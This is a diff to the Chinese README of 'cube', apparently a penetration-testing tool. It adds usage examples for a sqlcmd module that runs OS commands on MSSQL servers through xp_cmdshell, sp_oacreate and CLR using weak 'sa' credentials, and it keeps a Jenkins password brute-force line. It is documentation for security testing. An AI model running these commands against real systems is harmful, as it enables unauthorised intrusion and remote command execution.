@@ -59,7 +59,26 @@ cube crack -u root --pass-file pass.txt -i http://192.168.1.1 -x jenkins
 sqlserver爆破密码的代码(Event Code): 18456
 
 #### Sqlcmd
-执行命令，可用插件： `ssh`
+执行命令，可用插件： `ssh`,`mssql`,`mssql-wscript`,`mssql-com`,`mssql-clr`
+```
+Examples:
+cube sqlcmd -x ssh://172.16.157.163:2222 -usa -p123456 -e "whoami"
+
+
+cube sqlcmd -x mssql://172.16.157.163 -usa -p123456 -e "whoami"
+cube sqlcmd -x mssql://172.16.157.163 -usa -p123456 -e "close" //close xp_cmdshell
+
+cube sqlcmd -x mssql-wscript://172.16.157.163 -usa -p123456 -e "whoami"
+cube sqlcmd -x mssql-wscript://172.16.157.163 -usa -p123456 -e "close" //close sp_oacreate
+
+
+cube sqlcmd -x mssql-com://172.16.157.163 -usa -p123456 -e "whoami"
+cube sqlcmd -x mssql-com://172.16.157.163 -usa -p123456 -e "close" //close sp_oacreate
+
+
+cube sqlcmd -x mssql-clr://172.16.157.163 -usa -p123456 -e "whoami"
+cube sqlcmd -x mssql-clr://172.16.157.163 -usa -p123456 -e "close" //close CLR
+```
 
 ### TODO
 ##### Probe模块：
@@ -72,7 +91,7 @@ https://github.com/checkymander/Sharp-SMBExec/blob/master/SharpInvoke-SMBExec/Pr
 
 
 - [ ] 增加输出CSV
-- [ ] 增加sqlcmd的mssql命令执行
+- [x] 增加sqlcmd的mssql命令执行
 - [x] 增加请求间隔延迟 --delay，当设定这个选项的时候，线程强制设为1，这个选项大概用不上？
 - [ ] 变量名和函数名优化、
 - [ ] 增加蜜罐识别：<https://www.secrss.com/articles/28577>
